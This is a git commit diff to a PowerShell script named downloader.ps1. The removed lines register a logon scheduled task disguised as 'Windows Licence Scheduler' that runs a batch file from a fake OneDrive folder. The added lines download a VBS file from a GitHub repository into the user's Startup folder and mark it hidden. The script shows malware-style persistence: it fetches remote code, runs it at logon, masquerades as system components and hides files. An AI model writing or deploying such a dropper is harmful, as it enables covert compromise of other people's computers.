346291259c81e6f701716f6503c34c1238eae847
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-08-29 14:30:49 +0200

    Add files via upload

--- downloader.ps1
+++ downloader.ps1
@@ -17,44 +17,22 @@ try {
 } catch {
     Write-Error "Failed to hide the file: $_"
 }
-
-try {
-    # Create the scheduled task action
-    $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start /min """" ""C:\ProgramData\Microsoft OneDrive\setup\receiver.bat"""
-    Write-Host "Scheduled task action created."
+try{
+   $startupPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\file.vbs')
+   Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/file.vbs' -OutFile $startupPath
 } catch {
-    Write-Error "Failed to create scheduled task action: $_"
+   Write-Error "Failed to download starter"
+}
+try {
+    # Hide the vbs file if it exists
+    if (Test-Path $startupPath) {
+        Set-ItemProperty -Path $startupPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+        Write-Host "File hidden."
+    } else {
+        Write-Error "File not found."
+    }
+} catch {
+    Write-Error "Failed to hide the file: $_"
 }
 
-try {
-    # Create the scheduled task trigger
-    $trigger = New-ScheduledTaskTrigger -AtLogon
-    Write-Host "Scheduled task trigger created."
-} catch {
-    Write-Error "Failed to create scheduled task trigger: $_"
-}
 
-try {
-    # Create the scheduled task principal
-    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited
-    Write-Host "Scheduled task principal created."
-} catch {
-    Write-Error "Failed to create scheduled task principal: $_"
-}
-pause
-
-try {
-    # Create the scheduled task settings
-    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
-    Write-Host "Scheduled task settings created."
-} catch {
-    Write-Error "Failed to create scheduled task settings: $_"
-}
-
-try {
-    # Register the scheduled task with the name "Windows Licence Scheduler"
-    Register-ScheduledTask -TaskName "Windows Licence Scheduler" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
-    Write-Host "Scheduled task registered."
-} catch {
-    Write-Error "Failed to register scheduled task: $_"
-}
